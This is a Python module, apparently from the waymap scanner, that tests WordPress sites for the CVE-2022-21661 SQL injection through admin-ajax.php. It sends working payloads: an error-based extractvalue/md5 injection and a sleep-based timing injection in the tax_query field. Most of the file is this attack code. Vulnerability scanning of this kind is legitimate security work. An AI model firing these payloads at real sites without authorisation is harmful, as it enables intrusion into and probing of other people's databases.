# Copyright (c) 2024 waymap developers
# See the file 'LICENSE' for copying permission.
# CVE-2022-21661

import requests, hashlib, random
from urllib.parse import urlparse

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def check_admin_ajax_availability(target):
    """
    Check if the 'admin-ajax.php' file is accessible and returns expected status.
    """
    print("[•] Checking for the availability of 'admin-ajax.php' endpoint...")
    try:
        response = requests.get(f'{target}/wp-admin/admin-ajax.php', 
                                headers={"User-Agent": "Mozilla/5.0"}, verify=False, timeout=30)
        if response.status_code == 400 and '0' in response.text:
            print("[•] 'admin-ajax.php' endpoint is available and responding as expected.")
            return True
        else:
            print("[•] 'admin-ajax.php' is either not accessible or not responding as expected.")
            return False
    except Exception as e:
        print(f"[•] Error accessing 'admin-ajax.php': {e}")
        return False

def test_md5_injection(target):
    """
    Attempt to exploit using MD5 hash-based SQL injection.
    """
    print("[•] Attempting MD5 hash-based SQL injection...")
    rand_num = str(random.randint(1234567890987654321, 9999999999999999999)).encode('utf-8')
    data = '{"tax_query":{"0":{"field":"term_taxonomy_id","terms":["111) and extractvalue(rand(),concat(0x5e,md5(' + str(rand_num) + '),0x5e))#"]}}}'
    
    try:
        response = requests.post(f'{target}/wp-admin/admin-ajax.php', 
                                 data={"action":"test", "data":data},
                                 headers={"User-Agent": "Mozilla/5.0"}, verify=False, timeout=30)
        
        if response.status_code == 200 and hashlib.md5(rand_num).hexdigest() in response.text:
            print("[•] Vulnerable to SQL injection! (MD5 hash matched)")
            return True
        else:
            print("[•] MD5 hash injection failed. Proceeding to test time-based injection...")
            return False
    except Exception as e:
        print(f"[•] Error during MD5 hash injection: {e}")
        return False

def test_time_based_injection(target):
    """
    Attempt to exploit using time-based SQL injection.
    """
    print("[•] Attempting time-based SQL injection...")
    data = '{"tax_query":{"0":{"field":"term_taxonomy_id","terms":["111) or (select sleep(5))#"]}}}'
    
    try:
        response = requests.post(f'{target}/wp-admin/admin-ajax.php', 
                                 data={"action":"test", "data":data},
                                 headers={"User-Agent": "Mozilla/5.0"}, verify=False, timeout=30)
        
        if response.elapsed.total_seconds() >= 5 and response.status_code == 200:
            print("[•] Vulnerable to SQL injection! (Time-based delay detected)")
            return True
        else:
            print("[•] Time-based injection failed. Target does not appear vulnerable.")
            return False
    except Exception as e:
        print(f"[•] Error during time-based injection: {e}")
        return False

def scan_url(target):
    
        check_admin_ajax_availability(target)
        test_time_based_injection(target)
